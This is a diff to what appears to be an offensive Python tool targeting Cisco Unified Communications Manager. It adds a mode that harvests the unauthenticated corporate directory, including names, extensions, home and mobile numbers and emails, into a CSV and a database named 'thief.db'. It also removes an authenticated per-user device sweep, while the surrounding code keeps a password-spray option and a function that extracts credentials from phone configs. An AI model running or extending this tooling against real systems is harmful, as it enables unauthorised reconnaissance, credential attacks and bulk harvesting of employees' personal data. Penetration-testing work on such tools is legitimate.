@@ -31,6 +31,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 HTTP_TFTP_PORT = 6970
 # CUCM User Data Services (UDS) API — HTTPS only, default 8443
 UDS_PORT = 8443
+# Default output file for the standalone --directory harvest
+DEFAULT_DIRECTORY_OUTFILE = 'cucm_directory.csv'
 # Well-known default filenames the CUCM TFTP service hosts in addition to
 # per-device SEP<MAC>.cnf.xml configs. Always attempted so we can surface
 # firmware versions, trust-list presence, Jabber bootstrap config, etc.
@@ -587,12 +589,15 @@ def get_users_api(cucm_host, port=UDS_PORT, timeout=10, max_pages=10000):
 _UDS_DIRECTORY_FIELDS = (
     ('first_name', 'firstName'),
     ('middle_name', 'middleName'),
+    ('nick_name', 'nickName'),
     ('last_name', 'lastName'),
     ('display_name', 'displayName'),
     ('phone_number', 'phoneNumber'),
     ('home_number', 'homeNumber'),
     ('mobile_number', 'mobileNumber'),
+    ('pager', 'pager'),
     ('email', 'email'),
+    ('directory_uri', 'directoryUri'),
     ('ms_uri', 'msUri'),
     ('department', 'department'),
     ('title', 'title'),
@@ -604,10 +609,10 @@ _UDS_DIRECTORY_FIELDS = (
 def parse_uds_directory(xml_body):
     """Return a list of dicts, one per <user> block in a /cucm-uds/users page.
 
-    Keys: username, first_name, middle_name, last_name, display_name,
-    phone_number, home_number, mobile_number, email, ms_uri, department, title,
-    manager, user_id. Missing fields are '' (empty string). A <user> with no
-    <userName> is skipped."""
+    Keys: username, first_name, middle_name, nick_name, last_name,
+    display_name, phone_number, home_number, mobile_number, pager, email,
+    directory_uri, ms_uri, department, title, manager, user_id. Missing fields
+    are '' (empty string). A <user> with no <userName> is skipped."""
     records = []
     for block in re.findall(r'<user\b[^>]*>(.*?)</user>', xml_body, re.DOTALL):
         name_match = re.search(r'<userName>([^<]+)</userName>', block)
@@ -627,8 +632,9 @@ def get_user_directory_api(cucm_host, port=UDS_PORT, timeout=10, max_pages=10000
     if _TEST_MODE:
         return [
             {'username': 'testuser1', 'first_name': 'Test', 'middle_name': '',
-             'last_name': 'One', 'display_name': 'Test One', 'phone_number': '1001',
-             'home_number': '', 'mobile_number': '', 'email': 'testuser1@corp.test',
+             'nick_name': '', 'last_name': 'One', 'display_name': 'Test One',
+             'phone_number': '1001', 'home_number': '', 'mobile_number': '',
+             'pager': '', 'email': 'testuser1@corp.test', 'directory_uri': 'testuser1@corp.test',
              'ms_uri': '', 'department': 'IT', 'title': '', 'manager': '',
              'user_id': 'uuid-testuser1'},
         ]
@@ -752,20 +758,24 @@ def record_uds_directory(cucm_host, records, db_file='thief.db'):
         for r in records:
             cursor.execute('''
                 INSERT INTO uds_directory
-                    (cucm_host, username, first_name, middle_name, last_name,
-                     display_name, phone_number, home_number, mobile_number,
-                     email, ms_uri, department, title, manager, user_id,
+                    (cucm_host, username, first_name, middle_name, nick_name,
+                     last_name, display_name, phone_number, home_number,
+                     mobile_number, pager, email, directory_uri, ms_uri,
+                     department, title, manager, user_id,
                      first_seen, last_seen)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                 ON CONFLICT(cucm_host, username) DO UPDATE SET
                     first_name=excluded.first_name,
                     middle_name=excluded.middle_name,
+                    nick_name=excluded.nick_name,
                     last_name=excluded.last_name,
                     display_name=excluded.display_name,
                     phone_number=excluded.phone_number,
                     home_number=excluded.home_number,
                     mobile_number=excluded.mobile_number,
+                    pager=excluded.pager,
                     email=excluded.email,
+                    directory_uri=excluded.directory_uri,
                     ms_uri=excluded.ms_uri,
                     department=excluded.department,
                     title=excluded.title,
@@ -774,10 +784,12 @@ def record_uds_directory(cucm_host, records, db_file='thief.db'):
                     last_seen=excluded.last_seen
             ''', (
                 cucm_host, r.get('username', ''), r.get('first_name', ''),
-                r.get('middle_name', ''), r.get('last_name', ''),
-                r.get('display_name', ''), r.get('phone_number', ''),
-                r.get('home_number', ''), r.get('mobile_number', ''),
-                r.get('email', ''), r.get('ms_uri', ''), r.get('department', ''),
+                r.get('middle_name', ''), r.get('nick_name', ''),
+                r.get('last_name', ''), r.get('display_name', ''),
+                r.get('phone_number', ''), r.get('home_number', ''),
+                r.get('mobile_number', ''), r.get('pager', ''),
+                r.get('email', ''), r.get('directory_uri', ''),
+                r.get('ms_uri', ''), r.get('department', ''),
                 r.get('title', ''), r.get('manager', ''), r.get('user_id', ''),
                 timestamp, timestamp,
             ))
@@ -972,15 +984,6 @@ def parse_uds_devices(xml_body):
     return re.findall(r'<device>(SEP[0-9A-Fa-f]{12})</device>', xml_body)
 
 
-def parse_uds_device_collection(xml_body):
-    """Extract SEP device names from a /cucm-uds/user/{id}/devices response body.
-
-    That endpoint wraps each device in a <device> element with child fields; the
-    SEP name lives in <name>SEP…</name> (unlike the /user/{id} associatedDevices
-    shape, where it is the bare <device> text — see parse_uds_devices)."""
-    return re.findall(r'<name>(SEP[0-9A-Fa-f]{12})</name>', xml_body)
-
-
 def log_uds_device(cucm_host, username, device_name, source, db_file='thief.db'):
     """Insert a (cucm_host, username, device_name) row into uds_devices; ignores duplicates."""
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
@@ -1050,120 +1053,6 @@ def enumerate_devices_unauthenticated(cucm_host, port, usernames, db_file, threa
     for t in thread_list:
         t.join()
     return found_count
-
-
-def enumerate_devices_authenticated(cucm_host, username, password, port, usernames,
-                                    db_file, threads=10, no_db=False, _probe_fn=None):
-    """
-    Query each target username's UDS devices using the single (username, password)
-    credential, in parallel. Logs found SEP names to uds_devices with
-    source='uds_auth' (recording the target username) unless no_db is True.
-
-    Returns:
-      {
-        'devices': {target_username: [SEP names]},  # only users with >=1 device
-        'ok': int,        # targets that returned HTTP 200
-        'denied': int,    # targets that returned 401
-        'errors': int,    # targets that returned an error/other status
-      }
-    _probe_fn(cucm_host, username, password, port, target_user) is injectable for
-    testing; defaults to get_user_devices_authenticated.
-    """
-    if _probe_fn is None:
-        def _probe_fn(c_host, c_user, c_pass, c_port, t_user):
-            return get_user_devices_authenticated(c_host, c_user, c_pass, port=c_port, target_user=t_user)
-
-    result = {'devices': {}, 'ok': 0, 'denied': 0, 'errors': 0}
-    lock = threading.Lock()
-    work = queue.Queue()
-    for u in usernames:
-        work.put(u)
-
-    def worker():
-        while True:
-            try:
-                target_user = work.get_nowait()
-            except queue.Empty:
-                return
-            status, devices = _probe_fn(cucm_host, username, password, port, target_user)
-            with lock:
-                if status == 'ok':
-                    result['ok'] += 1
-                    if devices:
-                        result['devices'][target_user] = devices
-                elif status == 'unauthorized':
-                    result['denied'] += 1
-                else:
-                    result['errors'] += 1
-            if status == 'ok' and devices and not no_db:
-                for device_name in devices:
-                    log_uds_device(cucm_host, target_user, device_name, 'uds_auth', db_file)
-
-    thread_list = [threading.Thread(target=worker, daemon=True)
-                   for _ in range(max(1, min(threads, len(usernames))))]
-    for t in thread_list:
-        t.start()
-    for t in thread_list:
-        t.join()
-    return result
-
-
-def get_user_devices_authenticated(cucm_host, username, password, port=UDS_PORT, timeout=10, target_user=None):
-    """
-    Authenticated UDS device lookup for one user, querying BOTH endpoints that
-    can expose device names and unioning the results — so a server that
-    misconfigures authorization on one but not the other still yields devices:
-      - /cucm-uds/user/{target}          -> <device>SEP…</device> (associatedDevices)
-      - /cucm-uds/user/{target}/devices  -> <name>SEP…</name>      (device collection)
-
-    Authenticates as (username, password) via HTTP Basic auth. target_user
-    defaults to username (your own record). A different target_user queries
-    another user's record with the same credential; the server decides whether
-    to authorize it.
-
-    Returns (status, devices):
-      'ok'           — at least one endpoint returned HTTP 200; devices is the
-                       order-preserving deduped union of SEPs from both.
-      'unauthorized' — neither returned 200 but at least one returned HTTP 401.
-      'error'        — neither returned 200 or 401 (network failure / other).
-    """
-    target = target_user if target_user is not None else username
-    base = f'https://{cucm_host}:{port}/cucm-uds/user/{quote(target, safe="")}'
-    endpoints = (
-        (base, parse_uds_devices),
-        (f'{base}/devices', parse_uds_device_collection),
-    )
-
-    statuses = []
-    devices = []
-    for url, parser in endpoints:
-        dbg(f'UDS authed GET {url} (timeout={timeout}s)')
-        try:
-            resp = requests.get(url, auth=(username, password), verify=False, timeout=timeout)
-        except Exception as e:
-            dbg(f'UDS authed {url} raised {type(e).__name__}: {e}')
-            statuses.append('error')
-            continue
-        dbg(f'UDS authed {url} -> {resp.status_code} ({len(resp.content)} bytes)')
-        if resp.status_code == 200:
-            statuses.append('ok')
-            devices.extend(parser(resp.text))
-        elif resp.status_code == 401:
-            statuses.append('unauthorized')
-        else:
-            dbg(f'UDS authed non-200/401 body (first 300 chars): {resp.text[:300]!r}')
-            statuses.append('error')
-
-    if 'ok' in statuses:
-        status = 'ok'
-    elif 'unauthorized' in statuses:
-        status = 'unauthorized'
-    else:
-        status = 'error'
-
-    seen = set()
-    deduped = [d for d in devices if not (d in seen or seen.add(d))]
-    return status, deduped
 
 
 def download_uds_discovered_configs(cucm_host, device_names, db_file, use_tftp=True, no_db=False):
@@ -1279,8 +1168,7 @@ def _spray_worker(work_queue, results, password, cucm_host, port, db_file, dead_
 
         if status_code == 200 and resp is not None:
             # Spray hits only the base /cucm-uds/user/{id} endpoint, so the
-            # associatedDevices parser is correct here (device discovery's
-            # two-endpoint union lives in get_user_devices_authenticated).
+            # associatedDevices parser is correct here.
             for device_name in parse_uds_devices(resp.text):
                 log_uds_device(cucm_host, username, device_name, 'spray_hit', db_file)
 
@@ -1579,9 +1467,10 @@ def search_for_secrets(CUCM_host, filename, use_tftp=True):
     return credentials, usernames
 
 _DIRECTORY_CSV_COLUMNS = (
-    'username', 'first_name', 'last_name', 'display_name', 'phone_number',
-    'home_number', 'mobile_number', 'email', 'ms_uri', 'department', 'title',
-    'manager', 'user_id',
+    'username', 'first_name', 'middle_name', 'nick_name', 'last_name',
+    'display_name', 'phone_number', 'home_number', 'mobile_number', 'pager',
+    'email', 'directory_uri', 'ms_uri', 'department', 'title', 'manager',
+    'user_id',
 )
 
 
@@ -1600,6 +1489,20 @@ def export_directory_to_csv(records, filename):
         writer.writerow(_DIRECTORY_CSV_COLUMNS)
         for r in records:
             writer.writerow([r.get(col, '') for col in _DIRECTORY_CSV_COLUMNS])
+
+
+def print_directory_table(records):
+    """Print a console summary of harvested UDS directory records:
+    username | extension (phoneNumber) | display name. Display name falls back
+    to 'first last' when displayName is empty."""
+    print("-" * 70)
+    print(f'{"Username":<20} {"Extension":<12} {"Name"}')
+    print("-" * 70)
+    for r in records:
+        name = r.get('display_name') or ' '.join(
+            p for p in (r.get('first_name', ''), r.get('last_name', '')) if p
+        )
+        print(f'{r.get("username", ""):<20} {r.get("phone_number", ""):<12} {name}')
 
 
 def export_to_csv(credentials, usernames, filename='seeyoucm_results.csv'):
@@ -1766,12 +1669,15 @@ def init_database(db_file='thief.db'):
             username TEXT NOT NULL,
             first_name TEXT,
             middle_name TEXT,
+            nick_name TEXT,
             last_name TEXT,
             display_name TEXT,
             phone_number TEXT,
             home_number TEXT,
             mobile_number TEXT,
+            pager TEXT,
             email TEXT,
+            directory_uri TEXT,
             ms_uri TEXT,
             department TEXT,
             title TEXT,
@@ -1782,6 +1688,13 @@ def init_database(db_file='thief.db'):
             UNIQUE(cucm_host, username)
         )
     ''')
+    # Migrate pre-existing uds_directory tables that lack the newer columns
+    # (CREATE TABLE IF NOT EXISTS won't add columns to an already-created table).
+    cursor.execute('PRAGMA table_info(uds_directory)')
+    _existing_cols = {row[1] for row in cursor.fetchall()}
+    for _col in ('nick_name', 'pager', 'directory_uri'):
+        if _col not in _existing_cols:
+            cursor.execute(f'ALTER TABLE uds_directory ADD COLUMN {_col} TEXT')
 
     # Create table for every spray attempt against the UDS user endpoint
     cursor.execute('''
@@ -2669,16 +2582,14 @@ def main():
     parser.add_argument('-T','--threads', type=int, default=40, help='Number of worker threads for brute force mode (default: 40)')
     parser.add_argument('--force', action='store_true', default=False, help='Bypass cache and force re-download of all configuration files')
     parser.add_argument('--userenum', action='store_true', default=False, help='Extract usernames via CUCM User Data Services (UDS) API')
+    parser.add_argument('--directory', action='store_true', default=False,
+                        help='Harvest the unauthenticated UDS corporate directory (users + extensions + contact fields) and exit. Always writes a CSV and prints a summary table. Requires -H.')
+    parser.add_argument('--directory-outfile', type=str, default=DEFAULT_DIRECTORY_OUTFILE, metavar='FILENAME',
+                        help=f'Output CSV for --directory (default: {DEFAULT_DIRECTORY_OUTFILE})')
     parser.add_argument('--servers', action='store_true', default=False, help='Enumerate the CUCM cluster topology via UDS /cucm-uds/servers (requires -H)')
     parser.add_argument('--http', action='store_true', default=False, help='Use HTTP (port 6970) as the primary download protocol, with TFTP fallback (default: TFTP first, HTTP fallback)')
     parser.add_argument('--uds-port', type=int, default=UDS_PORT,
-                        help=f'CUCM UDS API HTTPS port for UDS-based features (--userenum, --servers, --uds-devices; default: {UDS_PORT})')
-    parser.add_argument('--uds-devices', action='store_true', default=False,
-                        help='Discover SEP devices associated with a single end user via authenticated UDS, then download + parse their configs (requires -H, --uds-user, --uds-password; no admin privileges needed)')
-    parser.add_argument('--uds-user', type=str, default=None,
-                        help='End-user username for --uds-devices authentication')
-    parser.add_argument('--uds-password', type=str, default=None,
-                        help='End-user password for --uds-devices authentication')
+                        help=f'CUCM UDS API HTTPS port for UDS-based features (--userenum, --directory, --servers; default: {UDS_PORT})')
     # Password spray (UDS Basic Auth against /cucm-uds/user/{userid})
     parser.add_argument('--spray', action='store_true', default=False,
                         help='Password-spray the UDS API (requires -H; mutually exclusive with --brute-mac)')
@@ -2758,9 +2669,9 @@ def main():
                     conn = sqlite3.connect(db_file)
                     cur = conn.cursor()
                     if cucm_filter:
-                        cur.execute('SELECT username, first_name, last_name, display_name, phone_number, home_number, mobile_number, email, ms_uri, department, title, manager, user_id FROM uds_directory WHERE cucm_host = ? ORDER BY username', (cucm_filter,))
+                        cur.execute('SELECT username, first_name, middle_name, nick_name, last_name, display_name, phone_number, home_number, mobile_number, pager, email, directory_uri, ms_uri, department, title, manager, user_id FROM uds_directory WHERE cucm_host = ? ORDER BY username', (cucm_filter,))
                     else:
-                        cur.execute('SELECT username, first_name, last_name, display_name, phone_number, home_number, mobile_number, email, ms_uri, department, title, manager, user_id FROM uds_directory ORDER BY username')
+                        cur.execute('SELECT username, first_name, middle_name, nick_name, last_name, display_name, phone_number, home_number, mobile_number, pager, email, directory_uri, ms_uri, department, title, manager, user_id FROM uds_directory ORDER BY username')
                     dir_rows = cur.fetchall()
                     conn.close()
                     if dir_rows:
@@ -2930,6 +2841,24 @@ def main():
             print(f'[+] Logged {inserted} new cluster server entry/entries to database')
         quit(0)
 
+    if args.directory:
+        if not CUCM_host:
+            print('--directory requires -H/--host to specify the CUCM server')
+            quit(1)
+        print(f'Harvesting UDS directory from https://{CUCM_host}:{args.uds_port}/cucm-uds/users')
+        records = get_user_directory_api(CUCM_host, port=args.uds_port)
+        if not records:
+            print('[-] No directory records returned. Re-run with -d for request/response details.')
+            quit(0)
+        print(f'[+] Retrieved {len(records)} directory record(s):')
+        print_directory_table(records)
+        if not no_db:
+            written = record_uds_directory(CUCM_host, records, db_file)
+            print(f'[+] Stored {written} directory record(s) in database')
+        export_directory_to_csv(records, args.directory_outfile)
+        print(f'[+] Directory written to {args.directory_outfile}')
+        quit(0)
+
     if args.userenum:
         if not CUCM_host:
             print('--userenum requires -H/--host to specify the CUCM server')
@@ -2959,8 +2888,10 @@ def main():
                 if csv_output:
                     base_csv = csv_output if csv_output is not True else 'seeyoucm_results.csv'
                     dir_csv = _directory_csv_name(base_csv)
-                    export_directory_to_csv(directory, dir_csv)
-                    print(f'[+] Directory exported to CSV: {dir_csv}')
+                else:
+                    dir_csv = args.directory_outfile
+                export_directory_to_csv(directory, dir_csv)
+                print(f'[+] Directory written to {dir_csv}')
             if not no_db:
                 print(f'[*] Probing UDS for associated devices (unauthenticated)...')
                 found = enumerate_devices_unauthenticated(
@@ -2982,42 +2913,6 @@ def main():
                     print(f'[-] No device associations returned unauthenticated')
         else:
             print('[-] No users returned from UDS API. Re-run with -d for request/response details.')
-        quit(0)
-
-    if args.uds_devices:
-        if not CUCM_host:
-            print('--uds-devices requires -H/--host to specify the CUCM server')
-            quit(1)
-        if not args.uds_user or not args.uds_password:
-            print('--uds-devices requires both --uds-user and --uds-password')
-            quit(1)
-
-        print(f'Enumerating users from https://{CUCM_host}:{args.uds_port}/cucm-uds/users')
-        users = get_users_api(CUCM_host, port=args.uds_port)
-        if not users:
-            print('[-] No users returned from UDS — cannot sweep devices (run with -d for details)')
-            quit(0)
-
-        print(f'[*] Sweeping devices for {len(users)} user(s) using credentials for {args.uds_user!r}...')
-        sweep = enumerate_devices_authenticated(
-            CUCM_host, args.uds_user, args.uds_password, args.uds_port,
-            users, db_file, threads=threads, no_db=no_db,
-        )
-
-        all_seps = sorted({dev for devs in sweep['devices'].values() for dev in devs})
-        print(f'[+] Sweep complete: {sweep["ok"]} ok, {sweep["denied"]} denied, '
-              f'{sweep["errors"]} error(s); {len(all_seps)} unique device(s) found across '
-              f'{len(sweep["devices"])} user(s)')
-        for target_user in sorted(sweep['devices']):
-            print(f'    {target_user}: {", ".join(sorted(sweep["devices"][target_user]))}')
-
-        if not all_seps:
-            quit(0)
-
-        hits = download_uds_discovered_configs(
-            CUCM_host, all_seps, db_file, use_tftp=use_tftp, no_db=no_db,
-        )
-        print(f'[+] Config download complete: {hits}/{len(all_seps)} configs yielded credentials')
         quit(0)
 
     if args.spray:
